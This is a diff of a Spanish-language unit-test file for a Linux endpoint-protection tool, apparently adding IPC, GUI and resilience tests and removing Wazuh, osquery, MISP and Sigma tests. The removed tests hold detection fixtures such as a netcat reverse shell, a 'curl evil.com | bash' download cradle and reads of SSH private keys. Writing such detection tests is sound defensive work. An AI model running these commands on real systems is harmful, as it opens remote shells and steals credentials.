-        mock_vault = unittest.mock.MagicMock()
-        mock_scanner = unittest.mock.MagicMock()
-        mock_scanner.yara_manager.match_file.return_value = [
-            unittest.mock.MagicMock(rule="Demons_Reverse_Shell_Netcat")
-        ]
+        # 1. Verificar permisos 0660 del socket creado en disco
+        st = os.stat(sock_path)
+        mode = stat.S_IMODE(st.st_mode)
+        self.assertEqual(mode, 0o660, "El socket debe tener permisos 0660 (rw-rw----)")
 
-        alerts_captured = []
-        def alert_cb(a_dict):
-            alerts_captured.append(a_dict)
+        # 2. Verificar que se configure el grupo constantine-users
+        client = SecureIPCClient(socket_path=sock_path)
 
-        mgr = WazuhManager(
-            scanner=mock_scanner,
-            vault=mock_vault,
-            firewall=mock_firewall,
-            alert_callback=alert_cb
-        )
+        # 3. Usuario 1: Miembro de constantine-users (UID 1000) ejecutando comando de usuario (GET_STATUS)
+        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
+            resp_user = client.send_command("GET_STATUS")
+            self.assertEqual(resp_user.get("status"), "OK")
+            self.assertEqual(resp_user.get("version"), "5.2.2")
 
-        threat_file = os.path.join(self.tmp, "c2_payload.sh")
-        with open(threat_file, "w") as f:
-            f.write("#!/bin/bash\nnc -e /bin/sh 1.2.3.4 4444\n")
+        # 4. Usuario 1: Miembro de constantine-users (UID 1000) intentando comando administrativo (UPDATE_SIGNATURES)
+        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
+            resp_admin_denied = client.send_command("UPDATE_SIGNATURES")
+            self.assertEqual(resp_admin_denied.get("status"), "ERROR")
+            self.assertEqual(resp_admin_denied.get("code"), "UNAUTHORIZED")
+            self.assertIn("RBAC", resp_admin_denied.get("message", ""))
 
-        alert = mgr.on_file_changed(threat_file, event_type=WazuhFIMEventType.FILE_CREATED, pid=8877)
+        # 5. Usuario 2: Usuario ajeno sin permisos en socket
+        # Simulación de PermissionError al abrir el socket por no pertenecer al grupo
+        with patch.object(socket.socket, "connect", side_effect=PermissionError("Permission denied")):
+            resp_no_perm = client.send_command("GET_STATUS")
+            self.assertEqual(resp_no_perm.get("code"), "PERMISSION_DENIED")
+            self.assertIn("constantine-users", resp_no_perm.get("message", ""))
 
-        self.assertIsNotNone(alert)
-        self.assertEqual(alert.level, 12)
-        self.assertTrue(alert.active_response_executed)
-        self.assertEqual(len(alerts_captured), 1)
+        # 6. Usuario 3: Superusuario Root (UID 0) ejecutando comando administrativo
+        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 1, 0, 0)):
+            resp_root = client.send_command("ADD_WHITELIST", {"path": "/opt/custom_tool.sh"})
+            self.assertEqual(resp_root.get("status"), "OK")
 
-        # Validar Respuesta Activa de Wazuh ejecutada
-        mock_firewall.contain_process.assert_called_once_with(8877, reason="Wazuh AR: Regla 100202 (Nivel 12)")
-        mock_vault.quarantine_file.assert_called_once()
+        server.stop()
 
-
-
-    def test_osquery_native_import_and_facade(self):
+    def test_gui_eight_sections_and_strict_protection_invariant(self):
         """
-        Verifica la importación nativa y fachada pública de osquery:
-        1. Comprueba 'import osquery' de forma transparente.
-        2. Verifica métodos de nivel superior: is_available, get_version, query, get_security_diagnostic.
-        3. Verifica el motor de telemetría y tablas virtuales expuestas.
+        Verifica los requerimientos de la interfaz gráfica de usuario:
+        1. Regla Estricta: La interfaz NUNCA indica que el equipo está protegido si el demonio
+           está detenido o fanotify no funciona.
+        2. Existencia y consistencia de las 8 secciones:
+           - Inicio
+           - Protección
+           - Análisis
+           - Cuarentena
+           - Historial
+           - Actualizaciones
+           - Configuración
+           - Diagnóstico
+        3. Funcionamiento de escaneo rápido, personalizado y exclusiones.
         """
-        import osquery
-        self.assertIsNotNone(osquery)
-        self.assertIn("osquery", sys.modules)
-        self.assertTrue(hasattr(osquery, "is_available"))
-        self.assertTrue(hasattr(osquery, "get_version"))
-        self.assertTrue(hasattr(osquery, "query"))
-        self.assertTrue(hasattr(osquery, "get_security_diagnostic"))
+        from gui.app import ConstantineApp, ConstantineUIController, APP_VERSION
 
-        mgr = osquery.get_default_manager()
-        self.assertIsNotNone(mgr)
-        status = mgr.get_status_info()
-        self.assertIn("available", status)
-        self.assertIn("virtual_tables", status)
-        self.assertIn("processes", status["virtual_tables"])
-        self.assertIn("listening_ports", status["virtual_tables"])
+        controller = ConstantineUIController(socket_path="/nonexistent/socket.sock")
 
-    def test_osquery_sql_query_execution_and_virtual_tables(self):
-        """
-        Verifica la ejecución de consultas SQL arbitrarias sobre el sistema:
-        1. Consulta la tabla processes y valida que contenga PIDs numéricos y rutas.
-        2. Consulta la tabla users y valida la cuenta root (UID 0).
-        3. Consulta la tabla security_configurations y valida directivas de kernel.
-        """
-        import osquery
-        # 1. Consulta processes
-        procs = osquery.query("SELECT pid, name, uid FROM processes LIMIT 5;")
-        self.assertIsInstance(procs, list)
-        self.assertGreater(len(procs), 0)
-        self.assertIn("pid", procs[0])
-        self.assertIn("name", procs[0])
+        # 1. Caso Demonio Detenido: NUNCA indicar protegido
+        self.assertFalse(controller.can_claim_protected())
+        home_stopped = controller.get_home_section()
+        self.assertFalse(home_stopped["is_protected"])
+        self.assertEqual(home_stopped["status_code"], "DAEMON_STOPPED")
+        self.assertEqual(home_stopped["status_level"], "CRITICAL")
+        self.assertIn("DESPROTEGIDO", home_stopped["status_title"])
 
-        # 2. Consulta users
-        root_user = osquery.query("SELECT uid, username, shell FROM users WHERE uid = 0;")
-        self.assertIsInstance(root_user, list)
-        self.assertEqual(len(root_user), 1)
-        self.assertEqual(root_user[0]["username"], "root")
-
-        # 3. Consulta security_configurations
-        configs = osquery.query("SELECT key, status FROM security_configurations;")
-        self.assertIsInstance(configs, list)
-        keys = {c["key"] for c in configs}
-        self.assertIn("kernel.randomize_va_space", keys)
-
-    def test_osquery_security_diagnostic_posture(self):
-        """
-        Verifica la generación del informe de diagnóstico integral de seguridad:
-        1. Evalúa las 5 preguntas fundamentales de postura del sistema.
-        2. Valida la puntuación de salud (0 a 100) y categoría (OPTIMAL, WARNING, AT_RISK).
-        """
-        import osquery
-        report = osquery.get_security_diagnostic()
-        self.assertIsNotNone(report)
-        self.assertIn(report.overall_health, ("OPTIMAL", "WARNING", "AT_RISK"))
-        self.assertGreaterEqual(report.health_score, 0)
-        self.assertLessEqual(report.health_score, 100)
-
-        # Validar respuestas explícitas del informe
-        answers = report.summary_answers
-        self.assertIn("¿Tiene actualizaciones pendientes?", answers)
-        self.assertIn("¿Existen servicios desconocidos?", answers)
-        self.assertIn("¿Hay procesos ejecutándose desde ubicaciones sospechosas?", answers)
-        self.assertIn("¿Se modificaron archivos importantes o binarios SUID?", answers)
-        self.assertIn("¿Existen configuraciones inseguras?", answers)
-
-    def test_osquery_suspicious_processes_and_ports_detection(self):
-        """
-        Verifica la detección de anomalías específicas mediante filtros SQL:
-        1. Detección de procesos ejecutándose desde /tmp o con binario borrado.
-        2. Detección de puertos asociados comúnmente a balizas C2.
-        """
-        import osquery
-        mgr = osquery.get_default_manager()
-
-        # Inyectar en la base virtual un proceso sospechoso en /tmp y un puerto 4444
-        vdb = mgr.client._vdb
-        cur = vdb._db.cursor()
-        cur.execute("INSERT INTO processes VALUES (?, ?, ?, ?, ?, ?, ?, ?)", (99123, "miner_tmp", "/tmp/miner_tmp", "./miner_tmp", 1000, 1000, 1, "/tmp"))
-        cur.execute("INSERT INTO listening_ports VALUES (?, ?, ?, ?)", (99123, 4444, "tcp", "0.0.0.0"))
-        vdb._db.commit()
-
-        # Consultar directamente sin llamar refresh_tables para preservar la fila inyectada
-        cur.execute("SELECT pid, name, path FROM processes WHERE path LIKE '/tmp/%';")
-        susp = [dict(r) for r in cur.fetchall()]
-        self.assertGreaterEqual(len(susp), 1)
-        self.assertEqual(susp[0]["pid"], 99123)
-
-        cur.execute("SELECT port FROM listening_ports WHERE port = 4444;")
-        ports = [dict(r) for r in cur.fetchall()]
-        self.assertGreaterEqual(len(ports), 1)
-        self.assertEqual(ports[0]["port"], 4444)
-
-
-    def test_misp_native_import_and_facade(self):
-        """Verifica que el subsistema MISP se importe de forma nativa e integrada ('import misp')."""
-        import misp
-        self.assertTrue(hasattr(misp, "get_default_manager"))
-        self.assertTrue(hasattr(misp, "lookup_ioc"))
-        self.assertTrue(hasattr(misp, "ingest_event_json"))
-        self.assertTrue(misp.is_available())
-        self.assertIn("MISP", misp.get_version())
-
-        mgr = misp.get_default_manager()
-        self.assertIsNotNone(mgr)
-        status = mgr.get_status_info()
-        self.assertTrue(status.get("available"))
-        self.assertIn("events_count", status)
-        self.assertIn("iocs_count", status)
-
-    def test_misp_event_and_attribute_parsing(self):
-        """Verifica el parseo estricto del esquema oficial de eventos MISP (UUID, atributos, tags, Galaxy)."""
-        import misp
-        sample_event = {
-            "Event": {
-                "id": "201",
-                "uuid": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
-                "info": "Test Campaign Sandworm - C2 Nodes",
-                "threat_level_id": "1",
-                "analysis": "2",
-                "date": "2026-11-05",
-                "timestamp": "1730800000",
-                "Tag": [
-                    {"name": "tlp:amber"},
-                    {"name": 'misp-galaxy:threat-actor="Sandworm"'}
-                ],
-                "Attribute": [
-                    {
-                        "id": "5001",
-                        "uuid": "55555555-0000-0000-0000-111111111111",
-                        "type": "sha256",
-                        "category": "Payload delivery",
-                        "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-                        "to_ids": True,
-                        "comment": "Empty test hash"
-                    },
-                    {
-                        "id": "5002",
-                        "uuid": "55555555-0000-0000-0000-222222222222",
-                        "type": "ip-dst",
-                        "category": "Network activity",
-                        "value": "203.0.113.19",
-                        "to_ids": True,
-                        "comment": "C2 server IPv4"
-                    },
-                    {
-                        "id": "5003",
-                        "uuid": "55555555-0000-0000-0000-333333333333",
-                        "type": "domain",
-                        "category": "Network activity",
-                        "value": "sandworm-c2-beacon.ru",
-                        "to_ids": True,
-                        "comment": "C2 domain"
-                    }
-                ]
+        # 2. Caso Demonio activo pero Fanotify inactivo: NUNCA indicar protegido
+        mock_status_fanotify_down = {
+            "status": "OK",
+            "data": {
+                "daemon_running": True,
+                "fanotify": "INACTIVE",
+                "fanotify_operational": False,
+                "ebpf": "ACTIVE"
             }
         }
-        ev = misp.MISPEvent.from_dict(sample_event)
-        self.assertIsNotNone(ev)
-        self.assertEqual(ev.uuid, "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")
-        self.assertEqual(ev.threat_level, misp.MISPThreatLevel.HIGH)
-        self.assertEqual(len(ev.attributes), 3)
-        self.assertIn("tlp:amber", ev.tags)
+        with patch.object(controller, "get_daemon_status", return_value=mock_status_fanotify_down):
+            self.assertFalse(controller.can_claim_protected())
+            home_fanotify_down = controller.get_home_section()
+            self.assertFalse(home_fanotify_down["is_protected"])
+            self.assertEqual(home_fanotify_down["status_code"], "FANOTIFY_INACTIVE")
+            self.assertEqual(home_fanotify_down["status_level"], "CRITICAL")
+            self.assertIn("DESPROTEGIDO", home_fanotify_down["status_title"])
 
-    def test_misp_feed_ingestion_and_threat_intel_correlation(self):
-        """Verifica la ingesta de eventos MISP y su propagación atómica hacia ThreatIntelligence (threat_intel.db)."""
-        import misp
-        from core.engine.threat_intel import ThreatIntelligence
-
-        intel = ThreatIntelligence(db_path=":memory:")
-        mgr = misp.MISPManager(threat_intel=intel)
-
-        # Ingestar evento en caliente
-        test_sha = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
-        test_ip = "192.0.2.123"
-        test_domain = "malicious-apt-delivery.net"
-        raw_event = {
-            "Event": {
-                "id": "305",
-                "uuid": "bbbbbbbb-cccc-dddd-eeee-ffffffffffff",
-                "info": "Campana Lazarus Trojan Loader",
-                "threat_level_id": "1",
-                "Tag": ["tlp:white", "malware:trojan"],
-                "Attribute": [
-                    {"id": "601", "type": "sha256", "value": test_sha, "to_ids": True, "comment": "Lazarus Loader"},
-                    {"id": "602", "type": "ip-dst", "value": test_ip, "to_ids": True, "comment": "Lazarus C2 IP"},
-                    {"id": "603", "type": "domain", "value": test_domain, "to_ids": True, "comment": "Lazarus Domain"}
-                ]
+        # 3. Caso Demonio activo y Fanotify activo, eBPF degradado: Protegido con advertencia
+        mock_status_degraded = {
+            "status": "OK",
+            "data": {
+                "daemon_running": True,
+                "fanotify": "ACTIVE",
+                "fanotify_operational": True,
+                "ebpf": "DEGRADED",
+                "vault": "ACTIVE",
+                "usb": "ACTIVE",
+                "downloads": "ACTIVE",
+                "hardware": "ACTIVE",
+                "persistence": "ACTIVE"
             }
         }
-        attrs_count = mgr.ingest_misp_json(raw_event)
-        self.assertEqual(attrs_count, 3)
+        with patch.object(controller, "get_daemon_status", return_value=mock_status_degraded):
+            self.assertTrue(controller.can_claim_protected())
+            home_degraded = controller.get_home_section()
+            self.assertTrue(home_degraded["is_protected"])
+            self.assertEqual(home_degraded["status_code"], "PROTECTED_DEGRADED")
+            self.assertEqual(home_degraded["status_level"], "WARNING")
 
-        # Comprobar que ThreatIntelligence recibió los indicadores
-        hash_entry = intel.lookup_hash(test_sha)
-        self.assertIsNotNone(hash_entry)
-        self.assertIn("Lazarus", hash_entry["threat_name"])
-        self.assertEqual(hash_entry["source"], "MISP_ThreatIntel")
-
-        url_entry = intel.lookup_url(test_domain)
-        self.assertIsNotNone(url_entry)
-        self.assertEqual(url_entry["threat_type"], "C2_Domain")
-
-        ip_entry = intel.lookup_ip(test_ip)
-        self.assertIsNotNone(ip_entry)
-        self.assertEqual(ip_entry["threat_type"], "C2_Server")
-
-    def test_misp_ioc_lookup_and_threat_scoring(self):
-        """Verifica la resolución instantánea de indicadores (lookup_ioc) y el cálculo de nivel y confianza."""
-        import misp
-        mgr = misp.get_default_manager()
-
-        # El feed local empaquetado tiene APT29 CozyBear (hash 44d88612fea8a8f36de82e1278abb02f146a489c629479b0ea8b9c2445c7b39a)
-        apt29_hash = "44d88612fea8a8f36de82e1278abb02f146a489c629479b0ea8b9c2445c7b39a"
-        res_hash = mgr.lookup_ioc(apt29_hash)
-        self.assertIsNotNone(res_hash)
-        self.assertTrue(res_hash.matched)
-        self.assertEqual(res_hash.ioc_type, "sha256")
-        self.assertEqual(res_hash.threat_level, "High")
-        self.assertEqual(res_hash.confidence, 95)
-        self.assertIn("APT29", res_hash.campaign)
-
-        # Probar búsqueda por dominio
-        res_domain = mgr.lookup_ioc("apt29-exfiltration-telemetry.com")
-        self.assertIsNotNone(res_domain)
-        self.assertTrue(res_domain.matched)
-        self.assertEqual(res_domain.ioc_type, "domain")
-
-        # Probar búsqueda por IP
-        res_ip = mgr.lookup_ioc("198.51.100.77")
-        self.assertIsNotNone(res_ip)
-        self.assertTrue(res_ip.matched)
-        self.assertEqual(res_ip.ioc_type, "ip-dst")
-
-        # Indicador inexistente
-        res_none = mgr.lookup_ioc("nonexistent-clean-domain.org")
-        self.assertIsNone(res_none)
-
-
-    def test_sigma_native_import_and_facade(self):
-        """Verifica que el subsistema Sigma se importe de forma nativa e integrada ('import sigma')."""
-        import sigma
-        self.assertTrue(hasattr(sigma, "get_default_manager"))
-        self.assertTrue(hasattr(sigma, "evaluate_event"))
-        self.assertTrue(hasattr(sigma, "evaluate_process"))
-        self.assertTrue(hasattr(sigma, "list_rules"))
-        self.assertTrue(sigma.is_available())
-        self.assertIn("Sigma", sigma.get_version())
-
-        mgr = sigma.get_default_manager()
-        self.assertIsNotNone(mgr)
-        status = mgr.get_status_info()
-        self.assertTrue(status.get("available"))
-        self.assertGreaterEqual(status.get("rules_count", 0), 6)
-        self.assertIn("process_creation", status.get("categories", []))
-
-    def test_sigma_rule_parsing_and_modifiers(self):
-        """Verifica el parseo YAML de reglas Sigma y el funcionamiento de los modificadores (|contains, |startswith, |re, etc.)."""
-        import sigma
-        from core.engine.sigma_engine import SigmaRuleParser, SigmaEngine
-
-        sample_rule_yaml = """
-title: Test Custom SUID Modification
-id: test-suid-001
-status: test
-description: Test detection of chmod SUID
-author: Unit Test
-date: 2026-11-05
-references:
-  - https://github.com/SigmaHQ/sigma
-tags:
-  - attack.privilege_escalation
-logsource:
-  category: process_creation
-  product: linux
-detection:
-  selection_chmod:
-    Image|endswith: 'chmod'
-    CommandLine|contains:
-      - 'u+s'
-      - '4755'
-  selection_path:
-    CommandLine|contains:
-      - '/tmp/'
-      - '/bin/'
-  filter_clean:
-    User: 'root'
-  condition: (selection_chmod and selection_path) and not filter_clean
-level: high
-"""
-        rule = SigmaRuleParser.parse_yaml_content(sample_rule_yaml)
-        self.assertIsNotNone(rule)
-        self.assertEqual(rule.id, "test-suid-001")
-        self.assertEqual(rule.level, sigma.SigmaLevel.HIGH)
-
-        engine = SigmaEngine()
-        engine.add_rule(rule)
-
-        # 1. Evento que coincide: usuario no root ejecuta chmod u+s en /bin
-        hit_event = {
-            "Image": "/usr/bin/chmod",
-            "CommandLine": "chmod u+s /bin/sh",
-            "User": "attacker",
-            "ProcessId": 12345
+        # 4. Caso Óptimo: Todos los sistemas activos
+        mock_status_optimal = {
+            "status": "OK",
+            "data": {
+                "daemon_running": True,
+                "fanotify": "ACTIVE",
+                "fanotify_operational": True,
+                "ebpf": "ACTIVE",
+                "vault": "ACTIVE"
+            }
         }
-        matches = engine.evaluate_event(hit_event)
-        self.assertEqual(len(matches), 1)
-        self.assertEqual(matches[0].rule.id, "test-suid-001")
-        self.assertEqual(matches[0].level, "high")
+        with patch.object(controller, "get_daemon_status", return_value=mock_status_optimal):
+            self.assertTrue(controller.can_claim_protected())
+            home_optimal = controller.get_home_section()
+            self.assertTrue(home_optimal["is_protected"])
+            self.assertEqual(home_optimal["status_code"], "PROTECTED_OPTIMAL")
+            self.assertEqual(home_optimal["status_level"], "OK")
 
-        # 2. Evento filtrado (User es root) -> debe ser False
-        clean_event = {
-            "Image": "/usr/bin/chmod",
-            "CommandLine": "chmod u+s /bin/sh",
-            "User": "root",
-            "ProcessId": 1
-        }
-        matches_clean = engine.evaluate_event(clean_event)
-        self.assertEqual(len(matches_clean), 0)
+        # 5. Sección Protección
+        prot = controller.get_protection_section()
+        self.assertEqual(prot["section"], "PROTECCIÓN")
+        self.assertGreaterEqual(prot["total_modules"], 10)
+        self.assertIn("active_modules", prot)
+        self.assertIn("degraded_modules", prot)
 
-    def test_sigma_event_evaluation_and_detection(self):
-        """Verifica la detección de las 6 categorías clave solicitadas por el usuario sobre eventos reales."""
-        import sigma
+        # 6. Sección Análisis
+        scan_sec = controller.get_scan_section()
+        self.assertEqual(scan_sec["section"], "ANÁLISIS")
+        modes = [m["mode"] for m in scan_sec["available_modes"]]
+        self.assertIn("QUICK", modes)
+        self.assertIn("FULL", modes)
+        self.assertIn("CUSTOM", modes)
 
-        # 1. Ejecución sospechosa de comandos (download cradle)
-        m1 = sigma.evaluate_process(101, "bash", "/bin/bash", "curl -fsSL https://evil.com/x.sh | bash", 1000)
-        self.assertTrue(any("Download Cradle" in m.rule.title for m in m1))
+        # 7. Sección Cuarentena
+        quar_sec = controller.get_quarantine_section()
+        self.assertEqual(quar_sec["section"], "CUARENTENA")
+        self.assertIsInstance(quar_sec["items"], list)
 
-        # 2. Persistencia mediante servicios (systemd)
-        m2 = sigma.evaluate_process(102, "cp", "/bin/cp", "cp evil.service /etc/systemd/system/malware.service", 0)
-        self.assertTrue(any("Persistence" in m.rule.title for m in m2))
+        # 8. Sección Historial
+        hist_sec = controller.get_history_section()
+        self.assertEqual(hist_sec["section"], "HISTORIAL")
+        self.assertIsInstance(hist_sec["events"], list)
 
-        # 3. Cambios de permisos (chmod 777 /bin)
-        m3 = sigma.evaluate_process(103, "chmod", "/bin/chmod", "chmod 777 /bin/bash", 1000)
-        self.assertTrue(any("Permission" in m.rule.title for m in m3))
+        # 9. Sección Actualizaciones
+        upd_sec = controller.get_updates_section()
+        self.assertEqual(upd_sec["section"], "ACTUALIZACIONES")
+        self.assertEqual(upd_sec["app_version"], "5.2.2")
+        self.assertIn("yara", upd_sec["engines_status"])
+        self.assertIn("sigma", upd_sec["engines_status"])
+        self.assertIn("falco", upd_sec["engines_status"])
+        self.assertIn("wazuh", upd_sec["engines_status"])
+        self.assertIn("misp", upd_sec["engines_status"])
 
-        # 4. Actividades relacionadas con SSH (id_rsa dump)
-        m4 = sigma.evaluate_process(104, "cat", "/bin/cat", "cat ~/.ssh/id_rsa", 1000)
-        self.assertTrue(any("SSH" in m.rule.title for m in m4))
+        # 10. Sección Configuración
+        settings_sec = controller.get_settings_section()
+        self.assertEqual(settings_sec["section"], "CONFIGURACIÓN")
+        self.assertIn("exclusions", settings_sec)
+        self.assertIn("privacy", settings_sec)
+        # Rechazo estricto de exclusión en directorios críticos
+        rej = controller.add_exclusion("/usr/bin")
+        self.assertEqual(rej["status"], "ERROR")
+        self.assertEqual(rej["code"], "PROHIBITED_DIRECTORY")
 
-        # 5. Ejecución desde directorios temporales (/tmp)
-        m5 = sigma.evaluate_process(105, "dropper", "/tmp/dropper_bin", "./dropper_bin", 1000)
-        self.assertTrue(any("Temporary" in m.rule.title for m in m5))
+        # 11. Sección Diagnóstico
+        diag_sec = controller.get_diagnostic_section()
+        self.assertEqual(diag_sec["section"], "DIAGNÓSTICO")
+        self.assertIn("score", diag_sec)
+        self.assertIn("recommendations", diag_sec)
 
-        # 6. Comportamientos de ataques conocidos (LinPEAS)
-        m6 = sigma.evaluate_process(106, "bash", "/bin/bash", "bash linpeas.sh -a", 1000)
-        self.assertTrue(any("Privilege Escalation" in m.rule.title for m in m6))
+        # 12. Dashboard textual de ConstantineApp
+        app = ConstantineApp()
+        text_dash = app.render_text_dashboard()
+        self.assertIn("PANEL DE CONTROL v5.2.2", text_dash)
+        self.assertIn("1. INICIO", text_dash)
+        self.assertIn("2. PROTECCIÓN", text_dash)
+        self.assertIn("3. ANÁLISIS", text_dash)
+        self.assertIn("4. CUARENTENA", text_dash)
+        self.assertIn("5. HISTORIAL", text_dash)
+        self.assertIn("6. ACTUALIZACIONES", text_dash)
+        self.assertIn("7. CONFIGURACIÓN", text_dash)
+        self.assertIn("8. DIAGNÓSTICO", text_dash)
 
-    def test_sigma_integration_with_ebpf_and_scanner(self):
-        """Verifica la integración del gestor Sigma dentro de Scanner y EBPFMonitor."""
-        from core.engine.scanner import Scanner
-        from core.engine.ebpf_monitor import EBPFMonitor
+    def test_compatibility_matrix_tiers_and_distros(self):
+        """
+        Verifica la Matriz Oficial de Compatibilidad:
+        - Tier 1: Kernel >= 5.15 con BPF LSM en Ubuntu 22.04 / Debian 12 / Fedora 39
+        - Tier 2: Kernel 5.10 sin BPF LSM (modo degradado / contención reactiva)
+        - Tier 3: Kernel < 5.4 (incompatible / no soportado)
+        """
+        from core.engine.compatibility_matrix import (CompatibilityMatrix, TIER_1_OPTIMAL, TIER_2_DEGRADED, TIER_3_UNSUPPORTED)
+
+        matrix = CompatibilityMatrix()
+
+        # 1. Tier 1: Kernel moderno con BPF LSM
+        with patch.object(matrix, "check_bpf_lsm_support", return_value=True):
+            rep_t1 = matrix.evaluate_system(override_kernel="6.5.0-generic", override_distro_id="ubuntu", override_distro_ver="22.04")
+            self.assertEqual(rep_t1["tier"], TIER_1_OPTIMAL)
+            self.assertTrue(rep_t1["is_official_distro"])
+            self.assertTrue(rep_t1["bpf_lsm_supported"])
+            self.assertTrue(rep_t1["fanotify_supported"])
+
+        # 2. Tier 2: Kernel sin BPF LSM (Degraded Fallback)
+        with patch.object(matrix, "check_bpf_lsm_support", return_value=False):
+            rep_t2 = matrix.evaluate_system(override_kernel="5.10.0-8-amd64", override_distro_id="debian", override_distro_ver="11")
+            self.assertEqual(rep_t2["tier"], TIER_2_DEGRADED)
+            self.assertFalse(rep_t2["bpf_lsm_supported"])
+            self.assertTrue(rep_t2["fanotify_supported"])
+
+        # 3. Tier 3: Kernel obsoleto (< 5.4)
+        rep_t3 = matrix.evaluate_system(override_kernel="4.15.0-generic", override_distro_id="ubuntu", override_distro_ver="18.04")
+        self.assertEqual(rep_t3["tier"], TIER_3_UNSUPPORTED)
+        self.assertEqual(rep_t3["status"], "INCOMPATIBLE")
+        self.assertGreaterEqual(len(rep_t3["missing_requirements"]), 1)
+
+    def test_resilience_manager_maintenance_circuit_breaker_quarantine_rollback(self):
+        """
+        Verifica la arquitectura de recuperación ante fallos y resiliencia:
+        1. Modo de mantenimiento: suspende intercepciones y permite paso libre (FAN_ALLOW).
+        2. Disyuntor de emergencia (Circuit Breaker): evita bloqueos de archivos ante timeouts repetidos.
+        3. Desactivación segura de módulos defectuosos (Safe Module Quarantine).
+        4. Recuperación tras actualización fallida (Auto-Rollback).
+        """
+        from core.engine.resilience_manager import ResilienceManager
+        from core.engine.auto_updater import AutoUpdater
+
+        resilience = ResilienceManager(snapshot_dir=self.temp_dir.name)
+
+        # 1. Modo de mantenimiento
+        self.assertFalse(resilience.is_maintenance_mode_active())
+        self.assertFalse(resilience.is_file_access_permitted_fast())
+
+        resilience.enable_maintenance_mode(reason="Actualización de software por usuario")
+        self.assertTrue(resilience.is_maintenance_mode_active())
+        self.assertTrue(resilience.is_file_access_permitted_fast())
+
+        resilience.disable_maintenance_mode()
+        self.assertFalse(resilience.is_maintenance_mode_active())
+        self.assertFalse(resilience.is_file_access_permitted_fast())
+
+        # 2. Disyuntor de emergencia (Circuit Breaker para archivos)
+        self.assertFalse(resilience.emergency_bypass_active)
+        resilience.record_scan_timeout("/path/file1")
+        resilience.record_scan_timeout("/path/file2")
+        self.assertFalse(resilience.emergency_bypass_active)
+        # 3er timeout consecutivo -> Se dispara el disyuntor de emergencia
+        resilience.record_scan_timeout("/path/file3")
+        self.assertTrue(resilience.emergency_bypass_active)
+        self.assertTrue(resilience.is_file_access_permitted_fast(), "Debe permitir acceso inmediato para no congelar el sistema")
+
+        # Restablecimiento de disyuntor
+        resilience.reset_emergency_bypass()
+        self.assertFalse(resilience.emergency_bypass_active)
+
+        # 3. Aislamiento seguro de módulos defectuosos
+        self.assertFalse(resilience.is_module_isolated("flaky_module"))
+        resilience.record_module_failure("flaky_module", "Crash 1")
+        resilience.record_module_failure("flaky_module", "Crash 2")
+        self.assertFalse(resilience.is_module_isolated("flaky_module"))
+        # 3er fallo consecutivo -> Aislamiento del módulo defectuoso
+        just_isolated = resilience.record_module_failure("flaky_module", "Crash 3")
+        self.assertTrue(just_isolated)
+        self.assertTrue(resilience.is_module_isolated("flaky_module"))
+        self.assertFalse(resilience.is_module_isolated("healthy_module"), "Otros módulos deben permanecer activos")
+
+        resilience.reset_module_fault("flaky_module")
+        self.assertFalse(resilience.is_module_isolated("flaky_module"))
+
+        # 4. Recuperación tras actualización fallida con Auto-Rollback
+        updater = AutoUpdater(root_dir=self.temp_dir.name, backup_dir=self.temp_dir.name)
+        saved = updater.create_snapshot({"yara_rules": 15, "state": "STABLE"})
+        self.assertTrue(saved)
+
+        # Simular intento de actualización que falla la compilación
+        def broken_validator():
+            raise SyntaxError("Regla YARA malformada en la línea 45")
+
+        result = updater.apply_update_safely({"yara_rules": 20, "state": "BROKEN"}, validator_func=broken_validator)
+        self.assertEqual(result["status"], "ROLLBACK_APPLIED")
+        self.assertFalse(result["success"])
+        self.assertIn("rollback", result["rollback_status"].lower())
+
+    def test_external_integrations_probing_and_requirements_transparency(self):
+        """
+        Verifica la transparencia arquitectónica de integraciones externas:
+        1. requirements.txt existe, define dependencias obligatorias (cryptography, PyYAML)
+           y diferencia dependencias opcionales de librerías vs servicios independientes del SO.
+        2. Probing dinámico en adaptadores (Tetragon, Falco, Wazuh, osquery, MISP, Sigma, ClamAV):
+           - No asumen que los servicios externos están instalados por defecto.
+           - Si el demonio/binario no está en el SO, reportan modo STANDALONE_... con detalle claro.
+        3. Scanner.get_engine_manifest() retorna el manifiesto verificado de motores.
+        4. Demonio expone GET_INTEGRATIONS_STATUS a través de IPC.
+        """
+        req_path = os.path.join(ROOT_DIR, "requirements.txt")
+        self.assertTrue(os.path.exists(req_path), "requirements.txt debe existir en la raíz del proyecto")
+        with open(req_path, "r", encoding="utf-8") as f:
+            req_content = f.read()
+        self.assertIn("cryptography", req_content)
+        self.assertIn("PyYAML", req_content)
+        self.assertIn("pySigma", req_content)
+        self.assertIn("pymisp", req_content)
+        self.assertIn("osquery", req_content)
+        self.assertIn("falco", req_content)
+        self.assertIn("wazuh", req_content)
+        self.assertIn("tetragon", req_content)
+
+        from core.engine.tetragon_monitor import TetragonMonitor
+        from core.engine.falco_monitor import FalcoMonitor
+        from core.engine.wazuh_detector import WazuhDetector
+        from core.engine.osquery_diagnostics import OSQueryDiagnostics
+        from core.engine.misp_feed_manager import MISPFeedManager
+        from core.engine.sigma_engine import SigmaEngine
+
+        tetragon = TetragonMonitor()
+        probe_tetra = tetragon.probe_integration()
+        self.assertIn("mode", probe_tetra)
+        self.assertIn("daemon_installed", probe_tetra)
+        if not probe_tetra["daemon_running"]:
+            self.assertEqual(probe_tetra["mode"], "STANDALONE_POLICY_EMULATOR")
+
+        falco = FalcoMonitor()
+        probe_falco = falco.probe_integration()
+        self.assertIn("mode", probe_falco)
+        if not probe_falco["daemon_running"]:
+            self.assertEqual(probe_falco["mode"], "STANDALONE_RULE_MATCHER")
+
+        wazuh = WazuhDetector()
+        probe_wazuh = wazuh.probe_integration()
+        self.assertIn("mode", probe_wazuh)
+        if not probe_wazuh["agent_running"]:
+            self.assertEqual(probe_wazuh["mode"], "STANDALONE_FIM_YARA_ENGINE")
+
+        osq = OSQueryDiagnostics()
+        probe_osq = osq.probe_integration()
+        self.assertIn("mode", probe_osq)
+        if not probe_osq["binary_installed"]:
+            self.assertEqual(probe_osq["mode"], "STANDALONE_SQLITE_FACADE")
+
+        misp = MISPFeedManager()
